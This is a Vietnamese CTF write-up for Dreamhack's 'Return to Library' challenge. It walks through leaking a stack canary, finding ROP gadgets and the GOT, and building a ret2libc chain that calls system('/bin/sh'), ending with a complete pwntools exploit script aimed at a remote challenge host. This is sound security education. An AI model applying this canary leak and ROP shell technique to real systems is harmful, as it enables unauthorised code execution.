# Challenge: Return to Library

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/ret2library/rtl)
- Khi thực thi, chương trình cho user nhập 2 input liên tiếp. Sau đó exit().
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  system("echo 'system@plt'");
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100u);
  printf("Buf: %s\n", buf);
  puts("[2] Overwrite return address");
  printf("Buf: ");
  read(0, buf, 0x100u);
  return 0;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ Stripped:   No
```

## Giải pháp
- Xem checksec tôi thấy, canary mở. Do đó, đầu tiên tìm cách leak canary.
- Kiểm tra ida, tôi tìm thấy địa chỉ *0x0000000000400874* chứa chuỗi *"/bin/sh"*.
- Cùng với đó trong main có thực thi hàm system.
> Có thể khai thác đẩy địa chỉ chứa /bin/sh vào system bằng rdi.
- Tìm cách overwrite rdi => Check ROPgadget, tìm thấy được:
```
└─$ rop rtl pop   
[*] Đang tìm 'pop' trong rtl...
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: rtl
0x000000000040084c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040084e: pop r13; pop r14; pop r15; ret; 
0x0000000000400850: pop r14; pop r15; ret; 
0x0000000000400852: pop r15; ret; 
0x000000000040066b: pop rbp; mov edi, 0x601060; jmp rax; 
0x000000000040066b: pop rbp; mov edi, 0x601060; jmp rax; nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004006ad: pop rbp; mov edi, 0x601060; jmp rax; nop dword ptr [rax]; pop rbp; ret; 
0x000000000040084b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040084f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400678: pop rbp; ret; 
0x0000000000400853: pop rdi; ret; 
0x0000000000400851: pop rsi; pop r15; ret; 
0x000000000040084d: pop rsp; pop r13; pop r14; pop r15; ret;

└─$ rop rtl ret   
[*] Đang tìm 'ret' trong rtl...
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: rtl
0x0000000000400596: ret;
```
- Nhưng tôi còn thiếu làm sao để có địa chỉ system, do đó tôi check got trong lúc debug thấy rằng:
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/haiwh/CTF/Dreamhack/ret2library/rtl:
GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
[0x601018] puts@GLIBC_2.2.5 -> 0x4005b6 (puts@plt+6) ◂— push 0 /* 'h' */
[0x601020] __stack_chk_fail@GLIBC_2.4 -> 0x4005c6 (__stack_chk_fail@plt+6) ◂— push 1
[0x601028] system@GLIBC_2.2.5 -> 0x4005d6 (system@plt+6) ◂— push 2
[0x601030] printf@GLIBC_2.2.5 -> 0x4005e6 (printf@plt+6) ◂— push 3
[0x601038] read@GLIBC_2.2.5 -> 0x4005f6 (read@plt+6) ◂— push 4
[0x601040] setvbuf@GLIBC_2.2.5 -> 0x400606 (setvbuf@plt+6) ◂— push 
```
> Vậy ta có thể dùng exe.plt['system'] để thực thi cùng với gadget pop rdi để lấy đưọc shell.

## Quá trình
- Trước tiên leak địa chỉ canary, thì cần tính offset từ buf tới canary sau đó overwrite 1 bytes canary để có thể leak nó.
> Offset = b'A'56 + b'A' */1 byte overwrite canary/*
- Lần input thứ 1: Overwrite canary để leak canary.
- Sau khi leak được canary, dùng ROPgadget để lấy pop rdi và ret. Và check trong ida tôi thấy rằng địa chỉ *0x0000000000400874* chứa /bin/sh.
- Lần input thứ 2: Overwrite ret để đẩy /bin/sh vào rdi rồi ret call system để lấy được shell.
> Payload = b'A'*56 + p64(canary) + p(0) */Saved rbp/* + p64(pop_rdi) + p64(0x0000000000400874) + p64(ret) + p64(exe.plt['system'])
```
* Lưu ý: Khi chạy tới call system hãy quit luôn để lấy shell, đừng chạy vào do_system sẽ bị SIGSEGV vì dữ liệu lúc call này đã bị thay đổi do không đúng vị trí. 
```

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('rtl', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+209
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 24419)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak canary
sa(b'Buf: ', b'A'*57)
p.recvuntil(b'A'*57, drop=True)
canary_leak = u64((p.recv(7).ljust(8, b'\0')))
info("Canary leak: " + hex(canary_leak))

### STAGE 2: Overwrite
pop_rdi = 0x0000000000400853
ret = 0x0000000000400596
payload = flat(
    b'A'*56,
    p64(canary_leak << 8),
    p64(0),
    p64(pop_rdi),
    p64(0x400874),
    p64(ret),
    p64(exe.plt['system']),
    )
sa(b'Buf: ', payload)

p.interactive()

```
